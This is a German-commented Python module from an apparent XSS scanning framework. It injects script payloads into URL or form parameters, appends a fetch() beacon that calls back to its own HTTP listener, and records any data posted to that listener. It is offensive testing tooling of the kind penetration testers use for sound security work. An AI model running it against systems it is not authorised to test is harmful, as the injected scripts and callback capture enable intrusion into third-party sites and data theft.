#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XSS Hunter Pro Framework - XSS Validator
=======================================

Dieses Modul ist verantwortlich für:
1. Validierung von XSS-Schwachstellen
2. Testen von Payloads gegen URLs und Parameter
3. Erkennung erfolgreicher XSS-Angriffe
4. Callback-Server für DOM-basierte XSS-Erkennung

Autor: Anonymous
Lizenz: MIT
Version: 0.3.2
"""

import base64
import http.server
import json
import logging
import os
import re
import socketserver
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from typing import Any, Dict, List, Optional, Tuple, Union
import random
import string

# Konfiguration für Logging
logger = logging.getLogger("XSSHunterPro.XSSValidator") 

# Versuche, die Browser-Abstraktionsschicht zu importieren
try:
    from browser_abstraction import BrowserFactory
    logger.info("Browser-Abstraktionsschicht erfolgreich importiert")
except ImportError as e:
    logger.error(f"Fehler beim Importieren der Browser-Abstraktionsschicht: {e}")
    BrowserFactory = None

# Versuche, Selenium zu importieren
try:
    import selenium
    logger.info("Selenium erfolgreich importiert")
except ImportError:
    logger.warning("Selenium nicht gefunden, einige Funktionen sind möglicherweise eingeschränkt")
    selenium = None

class CallbackServer:
    """Ein einfacher HTTP-Server für Callbacks von XSS-Payloads."""

    def __init__(self, host: str = "0.0.0.0", port: int = 8088):
        """
        Initialisiert den Callback-Server.

        Args:
            host: Der Host, auf dem der Server läuft.
            port: Der Port, auf dem der Server läuft.
        """
        self.host = host
        self.port = port
        self.server = None
        self.server_thread = None
        self.callbacks = {}
        self.callback_data = {}
        
        logger.info(f"Callback-Server initialisiert (Host: {host}, Port: {port})")

    def start(self):
        """Startet den Callback-Server."""
        if self.is_running():
            logger.warning("Callback-Server läuft bereits")
            return
        
        class CallbackHandler(http.server.BaseHTTPRequestHandler) :
            def log_message(self, format, *args):
                # Unterdrücke Logging-Nachrichten
                pass
            
            def do_GET(self):
                try:
                    # Parse den Pfad
                    path = self.path
                    
                    # Callback-Format: /c/<token>
                    if path.startswith("/c/"):
                        token = path[3:]
                        
                        # Registriere den Callback
                        self.server.callback_server.callbacks[token] = time.time()
                        
                        # Sende eine Antwort
                        self.send_response(200)
                        self.send_header("Content-type", "text/html")
                        self.end_headers()
                        self.wfile.write(b"<html><body><h1>Callback received</h1></body></html>")
                        
                        logger.info(f"Callback empfangen für Token: {token}")
                    else:
                        # Sende eine 404-Antwort
                        self.send_response(404)
                        self.send_header("Content-type", "text/html")
                        self.end_headers()
                        self.wfile.write(b"<html><body><h1>404 Not Found</h1></body></html>")
                except Exception as e:
                    logger.error(f"Fehler bei der Verarbeitung der GET-Anfrage: {e}")
                    self.send_response(500)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(b"<html><body><h1>500 Internal Server Error</h1></body></html>")
            
            def do_POST(self):
                try:
                    # Parse den Pfad
                    path = self.path
                    
                    # Callback-Format: /c/<token>
                    if path.startswith("/c/"):
                        token = path[3:]
                        
                        # Lese die Daten
                        content_length = int(self.headers.get("Content-Length", 0))
                        post_data = self.rfile.read(content_length).decode("utf-8")
                        
                        try:
                            # Versuche, die Daten als JSON zu parsen
                            data = json.loads(post_data)
                        except json.JSONDecodeError:
                            # Wenn das Parsen fehlschlägt, verwende die Rohdaten
                            data = {"raw": post_data}
                        
                        # Registriere den Callback und die Daten
                        self.server.callback_server.callbacks[token] = time.time()
                        self.server.callback_server.callback_data[token] = data
                        
                        # Sende eine Antwort
                        self.send_response(200)
                        self.send_header("Content-type", "text/html")
                        self.end_headers()
                        self.wfile.write(b"<html><body><h1>Callback received</h1></body></html>")
                        
                        logger.info(f"Callback mit Daten empfangen für Token: {token}")
                    else:
                        # Sende eine 404-Antwort
                        self.send_response(404)
                        self.send_header("Content-type", "text/html")
                        self.end_headers()
                        self.wfile.write(b"<html><body><h1>404 Not Found</h1></body></html>")
                except Exception as e:
                    logger.error(f"Fehler bei der Verarbeitung der POST-Anfrage: {e}")
                    self.send_response(500)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(b"<html><body><h1>500 Internal Server Error</h1></body></html>")
        
        try:
            # Erstelle den Server
            self.server = socketserver.ThreadingTCPServer((self.host, self.port), CallbackHandler)
            self.server.callback_server = self
            
            # Starte den Server in einem separaten Thread
            self.server_thread = threading.Thread(target=self.server.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            logger.info(f"Callback-Server gestartet auf {self.host}:{self.port}")
        except Exception as e:
            logger.error(f"Fehler beim Starten des Callback-Servers: {e}")
            self.server = None
            self.server_thread = None

    def stop(self):
        """Stoppt den Callback-Server."""
        if not self.is_running():
            logger.warning("Callback-Server läuft nicht")
            return
        
        try:
            # Stoppe den Server
            self.server.shutdown()
            self.server.server_close()
            self.server_thread.join()
            
            self.server = None
            self.server_thread = None
            
            logger.info("Callback-Server gestoppt")
        except Exception as e:
            logger.error(f"Fehler beim Stoppen des Callback-Servers: {e}")

    def is_running(self) -> bool:
        """
        Überprüft, ob der Callback-Server läuft.

        Returns:
            True, wenn der Server läuft, sonst False.
        """
        return self.server is not None and self.server_thread is not None and self.server_thread.is_alive()

    def clear(self):
        """Löscht alle Callbacks und Daten."""
        self.callbacks = {}
        self.callback_data = {}
        
        logger.info("Callback-Daten gelöscht")


class XSSValidator:
    """Validiert XSS-Schwachstellen in Webanwendungen."""

    def __init__(self, config: Dict[str, Any] = None, payload_manager=None, browser_config=None, callback_config=None):
        """
        Initialisiert den XSS-Validator mit der angegebenen Konfiguration.

        Args:
            config: Ein Dictionary mit Konfigurationsoptionen.
            payload_manager: Eine optionale Instanz des PayloadManagers.
            browser_config: Konfiguration für den Browser.
            callback_config: Konfiguration für den Callback-Server.
	"""
        self.config = config or {}
        self.payload_manager = payload_manager
        self.browser_config = browser_config or {}
        self.callback_config = callback_config or {}
        self.callbacks = {}

        logger.info("XSSValidator initialisiert")

        # Initialisiere den Browser
        self.browser = None
        if BrowserFactory:
            try:
                browser_config = self.config.get("browser", {})
                if isinstance(browser_config, bool):
                    logger.warning("Config ist ein Boolean, verwende leeres Dictionary")
                    browser_config = {}
                self.browser = BrowserFactory.create_browser(browser_config)
                logger.info(f"Browser {browser_config} über Abstraktionsschicht initialisiert")
            except Exception as e:
                logger.error(f"Fehler bei der Initialisierung des Browsers: {e}")
        
        # Initialisiere den Callback-Server
        self.callback_server = CallbackServer(
            host=self.config.get("callback_host", "0.0.0.0"),
            port=self.config.get("callback_port", 8088)
        )
        
        # Starte den Callback-Server, falls aktiviert
        if self.config.get("callback_server_enabled", True):
            self.callback_server.start()
        
        logger.info("XSS-Validator initialisiert")

    def validate_xss(self, url: str, param: str, payload: str, method: str = "GET", data: Dict[str, str] = None) -> Dict[str, Any]:
        """
        Validiert eine XSS-Schwachstelle.

        Args:
            url: Die URL der Webanwendung.
            param: Der Parameter, der getestet werden soll.
            payload: Der XSS-Payload.
            method: Die HTTP-Methode (GET oder POST).
            data: Zusätzliche Daten für POST-Anfragen.

        Returns:
            Ein Dictionary mit den Ergebnissen der Validierung.
        """
        logger.info(f"Validiere XSS für URL: {url}, Parameter: {param}, Payload: {payload}, Methode: {method}")
        
        # Initialisiere das Ergebnis
        result = {
            "url": url,
            "param": param,
            "payload": payload,
            "method": method,
            "success": False,
            "evidence": None,
            "screenshot": None,
            "error": None
        }
        
        try:
            # Überprüfe, ob der Browser verfügbar ist
            if not self.browser:
                logger.error("Browser nicht verfügbar")
                result["error"] = "Browser nicht verfügbar"
                return result
            
            # Generiere ein Token für den Callback
            token = self._generate_token()
            
            # Füge das Token zum Payload hinzu
            payload_with_token = self._add_token_to_payload(payload, token)
            
            # Führe die Anfrage aus
            if method.upper() == "GET":
                response = self._test_payload_get(url, param, payload_with_token)
            else:  # POST
                response = self._test_payload_post(url, param, payload_with_token, data)
            
            # Überprüfe, ob die Anfrage erfolgreich war
            if response.get("status_code", 0) == 0:
                logger.error(f"Fehler bei der Anfrage: {response.get('error')}")
                result["error"] = response.get("error")
                return result
            
            # Überprüfe, ob der Payload ausgeführt wurde
            success, evidence = self._validate_with_callback(token)
            
            if not success:
                # Versuche, den Payload im Quellcode zu finden
                success, evidence = self._validate_with_source(response.get("content", ""), payload)
            
            # Aktualisiere das Ergebnis
            result["success"] = success
            result["evidence"] = evidence
            
            # Nimm einen Screenshot auf, falls verfügbar
            if success and hasattr(self.browser, "take_screenshot"):
                screenshot = self.browser.take_screenshot()
                result["screenshot"] = screenshot
            
            logger.info(f"XSS-Validierung abgeschlossen: {'Erfolgreich' if success else 'Fehlgeschlagen'}")
        except Exception as e:
            logger.error(f"Fehler bei der XSS-Validierung: {e}")
            result["error"] = str(e)
        
        return result

    def _test_payload_get(self, url: str, param: str, payload: str) -> Dict[str, Any]:
        """
        Testet einen Payload mit einer GET-Anfrage.

        Args:
            url: Die URL der Webanwendung.
            param: Der Parameter, der getestet werden soll.
            payload: Der XSS-Payload.

        Returns:
            Ein Dictionary mit der Antwort.
        """
        # Parse die URL
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Füge den Payload zum Parameter hinzu
        query_params[param] = [payload]
        
        # Erstelle die neue Query-Zeichenfolge
        new_query = urlencode(query_params, doseq=True)
        
        # Erstelle die neue URL
        new_url_parts = list(parsed_url)
        new_url_parts[4] = new_query
        new_url = urlunparse(new_url_parts)
        
        # Führe die Anfrage aus
        return self.browser.get(new_url)

    def _test_payload_post(self, url: str, param: str, payload: str, data: Dict[str, str] = None) -> Dict[str, Any]:
        """
        Testet einen Payload mit einer POST-Anfrage.

        Args:
            url: Die URL der Webanwendung.
            param: Der Parameter, der getestet werden soll.
            payload: Der XSS-Payload.
            data: Zusätzliche Daten für die POST-Anfrage.

        Returns:
            Ein Dictionary mit der Antwort.
        """
        # Erstelle die POST-Daten
        post_data = data.copy() if data else {}
        post_data[param] = payload
        
        # Führe die Anfrage aus
        return self.browser.post(url, data=post_data)

    def _validate_with_callback(self, token: str, timeout: int = 5) -> Tuple[bool, Optional[Dict[str, Any]]]:
        """
        Validiert eine XSS-Schwachstelle mit einem Callback.

        Args:
            token: Das Token für den Callback.
            timeout: Das Timeout in Sekunden.

        Returns:
            Ein Tupel mit einem Boolean, der angibt, ob die Validierung erfolgreich war,
            und einem Dictionary mit den Callback-Daten.
        """
        # Überprüfe, ob der Callback-Server läuft
        if not self.callback_server.is_running():
            logger.warning("Callback-Server läuft nicht")
            return False, None
        
        # Warte auf den Callback
        start_time = time.time()
        while time.time() - start_time < timeout:
            if token in self.callback_server.callbacks:
                # Callback empfangen
                data = self.callback_server.callback_data.get(token)
                return True, data
            
            # Kurze Pause, um CPU-Last zu reduzieren
            time.sleep(0.1)
        
        # Timeout erreicht
        return False, None

    def _validate_with_source(self, source: str, payload: str) -> Tuple[bool, Optional[str]]:
        """
        Validiert eine XSS-Schwachstelle durch Suche im Quellcode.

        Args:
            source: Der Quellcode der Seite.
            payload: Der XSS-Payload.

        Returns:
            Ein Tupel mit einem Boolean, der angibt, ob die Validierung erfolgreich war,
            und einem String mit dem gefundenen Payload.
        """
        # Suche nach dem Payload im Quellcode
        if payload in source:
            # Payload gefunden
            return True, f"Payload im Quellcode gefunden: {payload}"
        
        # Payload nicht gefunden
        return False, None

    def _add_token_to_payload(self, payload: str, token: str) -> str:
        """
        Fügt ein Token zu einem Payload hinzu.

        Args:
            payload: Der XSS-Payload.
            token: Das Token für den Callback.

        Returns:
            Der Payload mit dem Token.
        """
        # Überprüfe, ob der Payload bereits ein Script-Tag enthält
        if "<script" in payload:
            # Füge das Token zum bestehenden Script hinzu
            return payload.replace("<script", f'<script data-token="{token}"')
        
        # Füge ein neues Script-Tag mit dem Token hinzu
        callback_url = f"http://{self.callback_server.host}:{self.callback_server.port}/c/{token}"
        callback_script = f'<script>fetch("{callback_url}") ;</script>'
        
        return payload + callback_script

    def _generate_token(self) -> str:
        """
        Generiert ein zufälliges Token für Callbacks.

        Returns:
            Das generierte Token.
        """
        return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    def close(self):
        """Schließt den XSS-Validator."""
        # Stoppe den Callback-Server
        if self.callback_server:
            self.callback_server.stop()
        
        # Schließe den Browser
        if self.browser:
            self.browser.close()
        
        logger.info("XSS-Validator geschlossen")


# Wenn dieses Skript direkt ausgeführt wird
if __name__ == "__main__":
    # Konfiguriere Logging
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )
    
    # Teste den XSS-Validator
    validator = XSSValidator()
    
    # Teste eine URL
    result = validator.validate_xss(
        url="https://example.com/search?q=test",
        param="q",
        payload="<script>alert('XSS') </script>",
        method="GET"
    )
    
    # Gib das Ergebnis aus
    print(json.dumps(result, indent=2))
    
    # Schließe den Validator
    validator.close()
